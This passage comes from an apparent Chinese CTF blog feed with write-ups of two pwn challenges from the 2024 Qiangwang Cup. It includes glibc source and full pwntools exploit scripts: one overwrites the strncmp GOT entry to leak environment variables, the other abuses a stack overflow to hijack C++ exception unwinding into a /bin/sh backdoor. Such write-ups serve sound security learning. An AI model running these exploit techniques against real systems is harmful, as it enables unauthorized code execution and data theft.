对环境变量的相关操作</p><ul><li>getenv</li><li>putenv</li><li>setenv</li></ul><p>这里可以直接上 glibc 的源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *</span><br><span class="line"><span class="title function_">getenv</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **ep;</span><br><span class="line">  <span class="type">uint16_t</span> name_start;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__environ == <span class="literal">NULL</span> || name[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name[<span class="number">1</span>] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* The name of the variable consists of only one character.  Therefore</span></span><br><span class="line"><span class="comment"> the first two characters of the environment entry are this character</span></span><br><span class="line"><span class="comment"> and a &#x27;=&#x27; character.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __BYTE_ORDER == __LITTLE_ENDIAN || !_STRING_ARCH_unaligned</span></span><br><span class="line">      name_start = (<span class="string">&#x27;=&#x27;</span> &lt;&lt; <span class="number">8</span>) | *(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      name_start = <span class="string">&#x27;=&#x27;</span> | ((*(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name) &lt;&lt; <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">for</span> (ep = __environ; *ep != <span class="literal">NULL</span>; ++ep)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _STRING_ARCH_unaligned</span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = *(<span class="type">uint16_t</span> *) *ep;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">0</span>]</span><br><span class="line">       | (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (name_start == ep_start)</span><br><span class="line">    <span class="keyword">return</span> &amp;(*ep)[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> len = <span class="built_in">strlen</span> (name);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _STRING_ARCH_unaligned</span></span><br><span class="line">      name_start = *(<span class="type">const</span> <span class="type">uint16_t</span> *) name;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      name_start = (((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name)[<span class="number">0</span>]</span><br><span class="line">    | (((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name)[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      len -= <span class="number">2</span>;</span><br><span class="line">      name += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (ep = __environ; *ep != <span class="literal">NULL</span>; ++ep)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _STRING_ARCH_unaligned</span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = *(<span class="type">uint16_t</span> *) *ep;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">0</span>]</span><br><span class="line">       | (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name_start == ep_start &amp;&amp; !<span class="built_in">strncmp</span> (*ep + <span class="number">2</span>, name, len)</span><br><span class="line">      &amp;&amp; (*ep)[len + <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &amp;(*ep)[len + <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察到最后一个循环中，它在遍历环境变量，并且使用 strncmp 这个函数，而这个函数恰好是在 got 表中的，如果尝试将其改为 puts，结果会如何呢？</p><img src="/2024/11/07/qwb2024_pre/10.png" class=""><p>可以发现只输出了 USER 环境变量，而且前两位被去掉了，我们从头来分析这个源码看。因为我们入口是 <code>getenv(&quot;USER&quot;)</code>，所以长度为 1 的判断就直接过掉，直接看 else 分支，似乎只有开头两个字符匹配到了，才会紧接着调用 strncmp，因此出现了只输出 USER 环境变量的问题。</p><p>但是当我选择选项 2 或 3 的时候，它输出了所有的环境变量</p><img src="/2024/11/07/qwb2024_pre/11.png" class=""><p>也就是说不管是调用 putenv 还是 setenv，在劫持了 strncmp 函数之后都可以完美输出所有环境变量。</p><p>它们两个函数内部都调用了一个函数 <code>__add_to_environ</code>。</p><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/setenv.c#L116">函数源码跳楼</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__add_to_environ (<span class="type">const</span> <span class="type">char</span> *name, <span class="type">const</span> <span class="type">char</span> *value, <span class="type">const</span> <span class="type">char</span> *combined,</span><br><span class="line">  <span class="type">int</span> replace)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **ep;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute lengths before locking, so that the critical section is</span></span><br><span class="line"><span class="comment">     less of a performance bottleneck.  VALLEN is needed only if</span></span><br><span class="line"><span class="comment">     COMBINED is null (unfortunately GCC is not smart enough to deduce</span></span><br><span class="line"><span class="comment">     this; see the #pragma at the start of this file).  Testing</span></span><br><span class="line"><span class="comment">     COMBINED instead of VALUE causes setenv (..., NULL, ...)  to dump</span></span><br><span class="line"><span class="comment">     core now instead of corrupting memory later.  */</span></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> namelen = <span class="built_in">strlen</span> (name);</span><br><span class="line">  <span class="type">size_t</span> vallen;</span><br><span class="line">  <span class="keyword">if</span> (combined == <span class="literal">NULL</span>)</span><br><span class="line">    vallen = <span class="built_in">strlen</span> (value) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  LOCK;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We have to get the pointer now that we have the lock and not earlier</span></span><br><span class="line"><span class="comment">     since another thread might have created a new environment.  */</span></span><br><span class="line">  ep = __environ;</span><br><span class="line"></span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ep != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (; *ep != <span class="literal">NULL</span>; ++ep)</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strncmp</span> (*ep, name, namelen) &amp;&amp; (*ep)[namelen] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  ++size;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中间省略很多代码，感兴趣可以直接去看完整源码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过分析这个函数的源码，可以发现这里会无条件地去遍历环境变量一次一次调用 strncmp 去判断，并且很幸运，第一个参数就是函数变量的指针，因此修改 strncmp 的 got 为 puts 函数，就可以输出所有的环境变量。</p><p>在远程环境中， flag 就在环境变量中。</p><p>总EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;47.94.231.2&#x27;,)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, payload</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;edit:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;show:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">env</span>(<span class="params">ch</span>):</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;sad !&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr1,payload</span>):</span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;addr&#x27;</span>,p64(addr1))</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x21ace0</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">write(libc_addr+<span class="number">0x21a118</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">env(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>第二种方法当然是可以用 Largebin Attack 去打，但是过于复杂，可能自己还没学会，主要在于分享自己的 EXP 和做题思路了，就不增加额外的工作量。</p><h2 id="expect-number"><a href="#expect-number" class="headerlink" title="expect_number"></a>expect_number</h2><p><a href="expect_number_cf786f84f8b86260b7eac1628ad682a8.zip">附件下载</a></p><p>这题没给 libc，应该题目自己有提权或者是给 flag 的东西，运行它输出的话，需要让我们最终计算得到 <code>0x4F5DA2</code> 这个值。</p><p>也是一个很经典的菜单</p><img src="/2024/11/07/qwb2024_pre/12.png" class=""><p>选项 1 发现它会根据随机 <code>1~4</code> 之间的整数来判断当前对数字做四则运算，1、2、3、4 分别对应了加、减、乘、除，并且另一个运算的数字只能是 0 1 2。既然是随机，那么交叉一下 srand 函数看看它是用了什么种子。</p><img src="/2024/11/07/qwb2024_pre/13.png" class=""><p>虽然调用了 time 函数，但是使用了 1 作为种子，因此序列是固定的，可以自己也编写一个 C 语言程序去输出这个序列。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">288</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,rand()%<span class="number">4</span>+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了避免被怀疑水长度，这里 288 个数字不展示了，仅在最后 EXP 展示。</p><p>很显然的，加减如果是 0，那么这次加减是无效的，乘除如果是 1，这次乘除也是无效的，来先看看指定数值的判断逻辑。</p><img src="/2024/11/07/qwb2024_pre/14.png" class=""><p>它只判断最后的那一个字节是否为 a8，自己构造序列也挺简单，遇到除法就给 1，遇到减法就给 0，结果发现再一次加法中突然报错了。</p><p>顺着报错找到代码</p><img src="/2024/11/07/qwb2024_pre/15.png" class=""><p>看了一下可能我的数值不超过 0x100，但是发现 &gt;0x80 的数被识别为了负数，前面将char类型做了符号扩展之后又转为无符号整数，自然就超出范围了。</p><p>这里举个例子构造 0x82，再次尝试加法的时候结果为 0x80于是进入里面的逻辑</p><img src="/2024/11/07/qwb2024_pre/16.png" class=""><p>可以发现它先做了零扩展（movzx），再做了符号扩展（movsx），因此下一步 RAX 的值变为了 <code>0xffffff80</code>，对于res来说，它是 -80 了，再+2变为 -78，转为无符号整数之后自然就超过了 0x100</p><img src="/2024/11/07/qwb2024_pre/17.png" class=""><p>因此如果想算出超过 0x80 的字节，必须算到对应的 &#x2F;2 的形式，而且最后一个运算符必须是 <code>*2</code>，结果只能是偶数，不能结果不能超过一个字节。</p><p>这些结论做稍加的数学推导应该很容易发现，但是当你好不容易凑好 0x54，再乘 2 得到 0xa8 的时候，会发现，远程 gift 是没有这个文件的。</p><img src="/2024/11/07/qwb2024_pre/18.png" class=""><p>咨询出题人（合理的咨询是不违反比赛规则的）后发现这是正常情况</p><img src="/2024/11/07/qwb2024_pre/19.png" class=""><p>那么题目就不是让我们执行这个 <code>system(&quot;cat gift&quot;)</code> 了，闲来无事去找字符串的时候发现 <code>/bin/sh</code>，发现在输入选项的时候有一个后门。</p><img src="/2024/11/07/qwb2024_pre/20.png" class=""><p>发现 cin 被 try 包裹了，如果出现运行时错误，那么就执行 <code>system(&quot;/bin/sh&quot;)</code>，而试过了各种输入都无法触发，一再陷入僵局，后面发现了退出函数有一个函数指针的调用。</p><img src="/2024/11/07/qwb2024_pre/21.png" class=""><p>正常情况下就是输出 <code>Good Bye</code>，于是想到能否将结果覆盖到上面，计算的数值的结构体是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">calc</span>&#123;</span></span><br><span class="line"><span class="type">char</span> *unknown;</span><br><span class="line"><span class="type">int</span> rounds;</span><br><span class="line"><span class="type">char</span> num[<span class="number">288</span>];</span><br><span class="line"><span class="type">char</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而我们的数值是随着 round 增加保存在后面的，查看是否有机会覆盖函数指针，结构体地址在 <code>5400</code>，而函数指针在 <code>5520</code>，显然我们足以覆盖这个函数指针。</p><img src="/2024/11/07/qwb2024_pre/22.png" class=""><p>具体字段图中标出，我们有机会覆盖任意字节到函数指针的低位。</p><p>于是找各种可能的情况，在 4c00 的地址 0x100 字节范围内看看有什么能修改的。</p><img src="/2024/11/07/qwb2024_pre/23.png" class=""><p>这里大概率都是虚函数表，发现 0x60 偏移处有一个栈溢出，栈溢出刚好足以让我们覆盖返回地址。</p><img src="/2024/11/07/qwb2024_pre/24.png" class=""><p>同时发现它主动检测溢出了会抛出运行时异常，运行时异常 emm，是不是可以和前面结合一下呢，答案是可以的，我们来了解一下C++如何处理异常的。我们都知道，在严格的异常处理流程，一个函数如果有可能抛出异常，要么你声明它本身也是可以抛出异常，要么将可能抛出异常的函数用 try 包裹。</p><p>C++ 如何实现多级的 try 判断呢，答案是栈回溯，它会寻找调用栈，判断之前的函数有没有被 try 包裹，有的话尝试捕获去处理。正常情况下这种设计当然没问题，如果返回值地址被我们修改的话，它就会根据返回值地址的值去寻找调用栈，那么此时我就可以尝试将这个抛出的异常在 cin 输入那里去捕获，然后完成 <code>system(&quot;/bin/sh&quot;)</code> 的调用。</p><p>并且 show 功能可以输出程序基地址，也不用去爆破了。</p><p>最后一点需要注意的是，看到后门这里，它有一条写栈内存的指令，因此在溢出的时候，RBP 要设为一个可写的地址。</p><p>最终 EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./expect_number&#x27;</span>,aslr=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;39.106.48.123&#x27;,32818)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">seq=<span class="string">&quot;4 3 2 4 2 4 3 1 2 2 3 4 3 4 4 3 1 3 1 1 4 1 4 2 3 3 3 4 4 4 2 3 3 3 2 4 2 1 4 3 2 2 2 4 1 2 3 1 4 3 2 3 4 1 1 2 3 3 1 2 2 2 1 4 1 2 3 2 2 2 1 4 3 2 3 4 3 1 4 3 4 1 1 3 1 1 4 4 3 4 1 1 1 1 4 1 3 3 3 4 4 3 3 3 4 2 2 3 2 1 1 1 2 1 3 2 2 2 1 4 1 2 4 2 2 4 2 4 2 4 4 1 2 2 3 2 3 4 4 1 1 4 1 2 4 4 3 1 1 4 1 2 1 4 3 2 3 4 2 4 4 1 1 1 2 3 2 1 3 1 1 3 4 1 4 4 4 2 4 1 1 4 2 1 4 4 3 2 3 4 2 2 4 2 3 1 4 4 1 2 1 1 4 4 2 3 3 1 1 3 1 1 2 2 2 1 1 4 3 4 3 4 1 2 1 3 2 4 3 3 2 3 3 1 2 4 4 1 1 4 3 1 4 4 3 1 1 3 4 3 2 2 2 3 3 2 1 1 1 3 3 2 1 1 3 3 1 2 3 1 1 1 1 4 4 3 1 4 2 4 2 3 2 3 1 4 4 2&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">seqnum=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> seq]</span><br><span class="line">target=<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">now=<span class="number">0</span></span><br><span class="line">ch=<span class="number">0</span></span><br><span class="line">k=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seqnum:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">        k += <span class="string">&#x27;2&#x27;</span></span><br><span class="line">        now += <span class="number">2</span></span><br><span class="line">        <span class="comment"># if now == target-2:</span></span><br><span class="line">        <span class="comment">#     gdb.attach(p)</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">2</span>:</span><br><span class="line">        k += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ch+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> now==target:<span class="keyword">break</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seqnum[ch:-<span class="number">0xc</span>]:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span> <span class="keyword">or</span> i==<span class="number">2</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">        k += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        k += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="comment"># input()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(k)</span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x4c60</span></span><br><span class="line">success(<span class="string">&#x27;code: &#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p64(addr+<span class="number">0x5080</span>)+p64(addr+<span class="number">0x251A</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Tell me your favorite number.&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地运行结果</p><img src="/2024/11/07/qwb2024_pre/25.png" class=""><p>远程运行结果（纪念一下hh）</p><img src="/2024/11/07/qwb2024_pre/26.png" class=""><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>能打出两题还是挺开心的，感谢强网杯提供的高质量赛题（就是rs和go没学过后面就坐牢了），不管是从考点还是利用难度来说，题目出的都是非常棒的。</p>]]></content>
    
    
    <summary type="html">本次强网杯初赛做出两道pwn题，把详细题解写一下记录。</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="pwn" scheme="https://xia0ji233.github.io/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>windows内核（1）——分页</title>
    <link href="https://xia0ji233.github.io/2024/11/07/WindowsKernel1/"/>
    <id>https://xia0ji233.github.io/2024/11/07/WindowsKernel1/</id>
    <published>2024-11-07T05:00:00.000Z</published>
    <updated>2024-11-07T05:41:25.551Z</updated>
    
